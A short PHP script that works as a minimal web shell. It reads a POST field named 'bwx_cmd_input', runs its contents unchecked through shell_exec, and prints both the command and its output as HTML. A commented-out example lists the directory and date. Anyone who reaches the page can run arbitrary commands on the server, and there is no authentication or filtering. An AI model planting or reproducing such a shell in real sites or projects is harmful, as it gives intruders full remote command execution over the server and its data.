<?php

$_cmd_in = $_POST["bwx_cmd_input"]; # array key such as 'bwx.cmd.input' may cause error
$_shex_out = shell_exec("$_cmd_in");

echo "<pre>
<b>command input</b>:
$_cmd_in 

<b>execution result</b>:
$_shex_out

</pre>
";

/*
	$shex_out = shell_exec('pwd; ls -alF; date;');
	echo "<pre> $shex_out </pre>";
 */
?>
